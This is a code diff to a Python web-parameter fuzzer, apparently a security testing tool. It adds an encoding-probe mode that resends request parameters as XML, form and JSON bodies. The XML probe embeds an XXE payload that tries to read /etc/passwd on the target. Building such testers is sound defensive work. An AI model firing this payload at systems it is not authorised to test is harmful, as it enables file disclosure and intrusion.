@@ -7,6 +7,9 @@
 
 One parameter is varied per request; all other parameters retain original baseline values.
 Results stream to stdout as requests complete. Progress and errors go to stderr.
+
+Use --probe-encodings to send encoding variation probes (XML+XXE, form-encoded, etc.)
+using original manifest parameter values. Does not run corpus fuzz.
 """
 
 import argparse
@@ -15,9 +18,11 @@ import queue
 import sys
 import threading
 import time
-from dataclasses import asdict, dataclass
+import urllib.parse
+from dataclasses import asdict, dataclass, field
 from pathlib import Path
 from typing import Any
+from xml.sax.saxutils import escape as xml_escape
 
 import requests
 import urllib3
@@ -33,6 +38,7 @@ class FuzzResult:
     content_type: str
     body_preview: str
     error: str | None
+    probe_encoding: str | None = field(default=None)
 
 
 def _load_manifest(path: str) -> dict[str, Any]:
@@ -76,9 +82,6 @@ def _get_fuzzable_params(manifest: dict[str, Any], only: list[str] | None) -> li
         if p.get("fuzzable", True):
             params.append(p["name"])
 
-    # Path segments and headers are not fuzz targets by default in run_fuzz
-    # (they can be added to corpus dir to opt in)
-
     if only:
         params = [p for p in params if p in only]
 
@@ -115,7 +118,6 @@ def _build_fuzz_request(
     req = {k: v for k, v in base.items() if not k.startswith("_")}
     req["headers"] = dict(base["headers"])
 
-    # Determine where the param lives (query string, JSON body, form body)
     all_query = {p["name"] for p in manifest.get("query_params", [])}
     all_body = {p["name"] for p in manifest.get("body_params", [])}
     body_format = manifest.get("body_format", "")
@@ -123,8 +125,6 @@ def _build_fuzz_request(
     parsed_url = req["url"]
 
     if param in all_query:
-        # Rebuild query string with fuzz value substituted
-        import urllib.parse
         parsed = urllib.parse.urlparse(parsed_url)
         qs = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
         qs[param] = value
@@ -134,14 +134,12 @@ def _build_fuzz_request(
 
     elif param in all_body and body_format == "json":
         body = dict(base.get("_body_json", {}))
-        # Coerce value to the original JSON type if possible
         original_type = next(
             (p.get("type", "string") for p in manifest.get("body_params", [])
              if p["name"] == param),
             "string",
         )
-        coerced = _coerce_value(value, original_type)
-        body[param] = coerced
+        body[param] = _coerce_value(value, original_type)
         req["json"] = body
 
     elif param in all_body and body_format == "form":
@@ -153,11 +151,7 @@ def _build_fuzz_request(
 
 
 def _coerce_value(value: str, original_type: str) -> Any:
-    """Try to coerce a string fuzz value to the original parameter type.
-
-    If the fuzz value is 'null', 'true', 'false', or a number string, coerce it to the
-    appropriate Python type. Otherwise pass as-is (string injection).
-    """
+    """Try to coerce a string fuzz value to the original parameter type."""
     if value == "null":
         return None
     if value == "true":
@@ -166,9 +160,7 @@ def _coerce_value(value: str, original_type: str) -> Any:
         return False
     if original_type in ("integer", "float"):
         try:
-            if "." in value:
-                return float(value)
-            return int(value)
+            return float(value) if "." in value else int(value)
         except (ValueError, OverflowError):
             pass
     if original_type == "boolean":
@@ -177,6 +169,133 @@ def _coerce_value(value: str, original_type: str) -> Any:
         if value in ("0", "no", "off"):
             return False
     return value
+
+
+# ── Encoding probe helpers ────────────────────────────────────────────────────
+
+
+def _build_xml_xxe_probe(body_params: list[dict[str, Any]]) -> str:
+    """Build XML body with DOCTYPE XXE injection on the first fuzzable parameter."""
+    fuzzable = [p for p in body_params if p.get("fuzzable", True)]
+    if not fuzzable:
+        return ""
+    first = fuzzable[0]
+    rest = fuzzable[1:]
+    inner = f"<{first['name']}>&xxe;</{first['name']}>"
+    inner += "".join(
+        f"<{p['name']}>{xml_escape(str(p.get('value', '')))}</{p['name']}>"
+        for p in rest
+    )
+    return (
+        '<?xml version="1.0"?>'
+        '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+        f"<root>{inner}</root>"
+    )
+
+
+def _build_form_body(body_params: list[dict[str, Any]]) -> str:
+    fuzzable = [p for p in body_params if p.get("fuzzable", True)]
+    return urllib.parse.urlencode(
+        {p["name"]: str(p.get("value", "")) for p in fuzzable}
+    )
+
+
+def _build_json_body(body_params: list[dict[str, Any]]) -> str:
+    fuzzable = [p for p in body_params if p.get("fuzzable", True)]
+    return json.dumps({p["name"]: p.get("value", "") for p in fuzzable})
+
+
+def _run_encoding_probes(
+    manifest: dict[str, Any],
+    timeout: float,
+    no_verify: bool,
+    dry_run: bool = False,
+) -> None:
+    """Send encoding variation probes and stream NDJSON results."""
+    body_format = manifest.get("body_format", "")
+    body_params = manifest.get("body_params", [])
+    fuzzable = [p for p in body_params if p.get("fuzzable", True)]
+
+    if not fuzzable:
+        print(json.dumps({"error": "No fuzzable body params — cannot construct encoding probes."}))
+        sys.exit(1)
+
+    # Build probe list, skipping the format the request already uses
+    probes: list[tuple[str, str, bytes]] = []  # (label, content_type, body)
+
+    if body_format != "xml":
+        xml_body = _build_xml_xxe_probe(fuzzable)
+        if xml_body:
+            probes.append(("application/xml+xxe", "application/xml", xml_body.encode()))
+
+    if body_format not in ("form",):
+        form_body = _build_form_body(fuzzable)
+        probes.append(("application/x-www-form-urlencoded", "application/x-www-form-urlencoded",
+                        form_body.encode()))
+
+    if body_format not in ("json", ""):
+        json_body = _build_json_body(fuzzable)
+        probes.append(("application/json", "application/json", json_body.encode()))
+
+    if not probes:
+        print(json.dumps({"error": "No alternative encodings to probe for this body_format."}))
+        sys.exit(1)
+
+    if dry_run:
+        print(f"Encoding probes planned: {len(probes)}\n")
+        for label, _, body in probes:
+            preview = body[:100].decode("utf-8", errors="replace")
+            if len(body) > 100:
+                preview += "..."
+            print(f"  {label}:\n    {preview}\n")
+        return
+
+    base_headers = {
+        h["name"]: h["value"]
+        for h in manifest.get("headers", [])
+        if h["name"].lower() != "content-type"
+    }
+    method = manifest["method"]
+    url = manifest["url"]
+
+    print(f"  [encoding probes] Sending {len(probes)} probes to {url}", file=sys.stderr)
+
+    session = requests.Session()
+    session.verify = not no_verify
+
+    try:
+        for label, content_type, body in probes:
+            headers = {**base_headers, "Content-Type": content_type}
+            start = time.monotonic()
+            try:
+                resp = session.request(
+                    method=method, url=url, headers=headers, data=body, timeout=timeout,
+                )
+                elapsed_ms = int((time.monotonic() - start) * 1000)
+                body_preview = resp.text[:500].replace("\n", " ").replace("\r", "")
+                result = FuzzResult(
+                    param="Content-Type", value=label,
+                    status_code=resp.status_code, response_time_ms=elapsed_ms,
+                    content_length=len(resp.content),
+                    content_type=resp.headers.get("content-type", ""),
+                    body_preview=body_preview, error=None, probe_encoding=label,
+                )
+            except requests.exceptions.RequestException as exc:
+                elapsed_ms = int((time.monotonic() - start) * 1000)
+                result = FuzzResult(
+                    param="Content-Type", value=label,
+                    status_code=None, response_time_ms=elapsed_ms,
+                    content_length=0, content_type="", body_preview="",
+                    error=str(exc), probe_encoding=label,
+                )
+            print(json.dumps(asdict(result)), flush=True)
+    finally:
+        session.close()
+
+    print(f"Done. {len(probes)} encoding probes emitted.", file=sys.stderr)
+
+
+# ── Corpus fuzz ───────────────────────────────────────────────────────────────
 
 
 def _send_one(
@@ -192,14 +311,10 @@ def _send_one(
         elapsed_ms = int((time.monotonic() - start) * 1000)
         body = resp.text[:500].replace("\n", " ").replace("\r", "")
         return FuzzResult(
-            param=param,
-            value=value,
-            status_code=resp.status_code,
-            response_time_ms=elapsed_ms,
-            content_length=len(resp.content),
+            param=param, value=value, status_code=resp.status_code,
+            response_time_ms=elapsed_ms, content_length=len(resp.content),
             content_type=resp.headers.get("content-type", ""),
-            body_preview=body,
-            error=None,
+            body_preview=body, error=None,
         )
     except requests.exceptions.Timeout:
         elapsed_ms = int((time.monotonic() - start) * 1000)
@@ -244,15 +359,11 @@ def _worker(
             time.sleep(delay_ms / 1000.0)
 
 
-def _print_dry_run(corpus: dict[str, list[str]], manifest: dict[str, Any]) -> None:
-    rows = []
-    for param, values in corpus.items():
-        for value in values:
-            display_value = value if len(value) <= 50 else value[:47] + "..."
-            rows.append((param, display_value))
+def _print_dry_run(corpus: dict[str, list[str]]) -> None:
+    rows = [(p, v if len(v) <= 50 else v[:47] + "...") for p, vs in corpus.items() for v in vs]
 
     if not rows:
-        print("No fuzz tasks — corpus is empty.", file=sys.stderr)
+        print("No fuzz tasks — corpus is empty.")
         return
 
     print(f"Dry run: {len(rows)} requests planned\n")
@@ -279,30 +390,43 @@ def main() -> None:
                         help="Only fuzz this parameter (repeat to fuzz multiple)")
     parser.add_argument("--dry-run", action="store_true",
                         help="Print request plan without sending")
+    parser.add_argument(
+        "--probe-encodings", action="store_true",
+        help=(
+            "Send encoding variation probes (XML+XXE, form-encoded, JSON) using original "
+            "manifest values. Mutually exclusive with corpus fuzz — does not read corpus files."
+        ),
+    )
     args = parser.parse_args()
 
     manifest = _load_manifest(args.manifest)
+
+    if args.probe_encodings:
+        if args.no_verify:
+            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        _run_encoding_probes(manifest, args.timeout, args.no_verify, dry_run=args.dry_run)
+        return
+
     fuzzable = _get_fuzzable_params(manifest, args.params)
 
     if not fuzzable:
-        print(
-            json.dumps({"error": "No fuzzable parameters found in manifest. "
-                        "Check that body_params or query_params are present and fuzzable=true."}),
-        )
+        print(json.dumps({"error": (
+            "No fuzzable parameters found in manifest. "
+            "Check that body_params or query_params are present and fuzzable=true."
+        )}))
         sys.exit(1)
 
     corpus = _load_corpus(args.corpus_dir, fuzzable)
 
     if not corpus:
-        msg = (
+        print(json.dumps({"error": (
             f"No corpus files found in '{args.corpus_dir}'. "
             "Generate corpus files first (e.g. corpus/email.txt with one value per line)."
-        )
-        print(json.dumps({"error": msg}))
+        )}))
         sys.exit(1)
 
     if args.dry_run:
-        _print_dry_run(corpus, manifest)
+        _print_dry_run(corpus)
         return
 
     if args.no_verify:
@@ -320,16 +444,13 @@ def main() -> None:
     task_q: queue.Queue[tuple[str, str] | None] = queue.Queue()
     result_q: queue.Queue[FuzzResult | Exception] = queue.Queue()
 
-    # Enqueue all tasks
     for param, values in corpus.items():
         for value in values:
             task_q.put((param, value))
 
-    # Poison pills
     for _ in range(args.threads):
         task_q.put(None)
 
-    # Create session per thread for connection pooling
     sessions = [requests.Session() for _ in range(args.threads)]
     for s in sessions:
         s.verify = not args.no_verify
@@ -356,8 +477,7 @@ def main() -> None:
         if isinstance(item, Exception):
             print(f"  [error] Worker exception: {item}", file=sys.stderr)
         else:
-            result_dict = asdict(item)
-            print(json.dumps(result_dict), flush=True)
+            print(json.dumps(asdict(item)), flush=True)
 
         completed += 1
         if completed % 50 == 0:
